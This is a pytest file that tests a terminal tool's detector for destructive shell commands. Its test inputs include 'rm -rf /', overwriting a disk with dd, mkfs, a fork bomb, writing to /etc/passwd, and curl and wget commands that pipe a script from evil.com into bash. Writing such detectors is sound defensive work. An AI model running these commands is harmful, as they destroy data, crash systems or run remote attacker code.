"""Tests for the safety module's destructive command detection."""

import pytest

from cozyterm.core.safety import check_command, DANGEROUS_PATTERNS


class TestCheckCommand:
    """Tests for check_command()."""

    # --- Commands that SHOULD be flagged as dangerous ---

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "rm -rf /home/user",
            "rm -rf .",
            "rm -Rf some_dir",
        ],
    )
    def test_rm_rf_detected(self, command: str) -> None:
        is_dangerous, message = check_command(command)
        assert is_dangerous is True
        assert "rm" in message.lower() or "delete" in message.lower()

    @pytest.mark.parametrize(
        "command",
        [
            "rm -f file.txt",
            "rm --force file.txt",
            "rm -r dir/",
            "rm --recursive dir/",
            "rm -rf /tmp/test",
        ],
    )
    def test_rm_force_or_recursive_detected(self, command: str) -> None:
        is_dangerous, message = check_command(command)
        assert is_dangerous is True
        assert message != ""

    def test_sudo_detected(self) -> None:
        is_dangerous, message = check_command("sudo apt-get install vim")
        assert is_dangerous is True
        assert "privileges" in message.lower() or "sudo" in message.lower()

    def test_mkfs_detected(self) -> None:
        is_dangerous, message = check_command("mkfs.ext4 /dev/sda1")
        assert is_dangerous is True
        assert "format" in message.lower() or "destroy" in message.lower()

    @pytest.mark.parametrize(
        "command",
        [
            "dd if=/dev/zero of=/dev/sda bs=1M",
            "dd if=image.iso of=/dev/sdb",
        ],
    )
    def test_dd_to_device_detected(self, command: str) -> None:
        is_dangerous, message = check_command(command)
        assert is_dangerous is True
        assert "device" in message.lower() or "data" in message.lower()

    def test_redirect_to_block_device(self) -> None:
        is_dangerous, message = check_command("echo foo > /dev/sda")
        assert is_dangerous is True

    @pytest.mark.parametrize(
        "command",
        [
            "chmod 777 file.txt",
            "chmod -R 777 /var/www",
        ],
    )
    def test_chmod_777_detected(self, command: str) -> None:
        is_dangerous, message = check_command(command)
        assert is_dangerous is True
        assert "permission" in message.lower() or "777" in message

    def test_chown_recursive_detected(self) -> None:
        is_dangerous, message = check_command("chown -R root:root /home")
        assert is_dangerous is True

    def test_fork_bomb_detected(self) -> None:
        is_dangerous, message = check_command(":(){:|:& };:")
        assert is_dangerous is True
        assert "fork bomb" in message.lower() or "crash" in message.lower()

    def test_kill_minus_9_detected(self) -> None:
        is_dangerous, message = check_command("kill -9 1234")
        assert is_dangerous is True

    def test_killall_detected(self) -> None:
        is_dangerous, message = check_command("killall nginx")
        assert is_dangerous is True

    def test_redirect_to_etc(self) -> None:
        # The pattern requires \b before >, so > must follow a word character
        is_dangerous, message = check_command("cat file>/etc/passwd")
        assert is_dangerous is True
        assert "system" in message.lower() or "configuration" in message.lower()

    @pytest.mark.parametrize(
        "command",
        [
            "curl http://evil.com/script.sh | bash",
            "curl https://example.com/setup | sh",
        ],
    )
    def test_curl_pipe_to_shell_detected(self, command: str) -> None:
        is_dangerous, message = check_command(command)
        assert is_dangerous is True
        assert "script" in message.lower() or "shell" in message.lower()

    @pytest.mark.parametrize(
        "command",
        [
            "wget http://evil.com/script.sh | bash",
            "wget https://example.com/setup | sh",
        ],
    )
    def test_wget_pipe_to_shell_detected(self, command: str) -> None:
        is_dangerous, message = check_command(command)
        assert is_dangerous is True

    # --- Commands that should NOT be flagged ---

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "pwd",
            "echo hello",
            "cat file.txt",
            "git status",
            "python script.py",
            "pip install requests",
            "mkdir new_folder",
            "cp file1.txt file2.txt",
            "mv file.txt dir/",
            "grep -r pattern .",
            "find . -name '*.py'",
            "curl https://api.example.com/data",
            "wget https://example.com/file.tar.gz",
        ],
    )
    def test_safe_commands_not_flagged(self, command: str) -> None:
        is_dangerous, message = check_command(command)
        assert is_dangerous is False
        assert message == ""

    def test_rm_without_dangerous_flags_not_flagged(self) -> None:
        is_dangerous, message = check_command("rm file.txt")
        assert is_dangerous is False
        assert message == ""

    def test_dd_to_file_not_flagged(self) -> None:
        """dd writing to a regular file (not /dev/) should be safe."""
        is_dangerous, _ = check_command("dd if=/dev/zero of=testfile bs=1M count=10")
        assert is_dangerous is False

    def test_chmod_normal_not_flagged(self) -> None:
        """chmod with reasonable permissions should not be flagged."""
        is_dangerous, _ = check_command("chmod 644 file.txt")
        assert is_dangerous is False

    def test_kill_without_9_not_flagged(self) -> None:
        """A plain kill without -9 should not be flagged."""
        is_dangerous, _ = check_command("kill 1234")
        assert is_dangerous is False

    # --- Edge cases ---

    def test_empty_command(self) -> None:
        is_dangerous, message = check_command("")
        assert is_dangerous is False
        assert message == ""

    def test_whitespace_only_command(self) -> None:
        is_dangerous, message = check_command("   ")
        assert is_dangerous is False
        assert message == ""

    def test_leading_trailing_whitespace_stripped(self) -> None:
        """Commands with whitespace should still be detected."""
        is_dangerous, _ = check_command("  sudo ls  ")
        assert is_dangerous is True

    def test_check_command_returns_tuple(self) -> None:
        """Verify the return type is always a 2-tuple of (bool, str)."""
        result = check_command("ls")
        assert isinstance(result, tuple)
        assert len(result) == 2
        assert isinstance(result[0], bool)
        assert isinstance(result[1], str)

    def test_multiple_dangerous_patterns_returns_first_match(self) -> None:
        """A command matching multiple patterns should still return a result."""
        # sudo + rm -rf both match, but we just need one result
        is_dangerous, message = check_command("sudo rm -rf /")
        assert is_dangerous is True
        assert message != ""


class TestDangerousPatterns:
    """Tests for the DANGEROUS_PATTERNS constant."""

    def test_patterns_is_nonempty_list(self) -> None:
        assert isinstance(DANGEROUS_PATTERNS, list)
        assert len(DANGEROUS_PATTERNS) > 0

    def test_each_pattern_is_tuple_of_regex_and_str(self) -> None:
        import re
        for pattern, message in DANGEROUS_PATTERNS:
            assert isinstance(pattern, re.Pattern), f"Expected re.Pattern, got {type(pattern)}"
            assert isinstance(message, str), f"Expected str, got {type(message)}"
            assert len(message) > 0, "Warning message should not be empty"
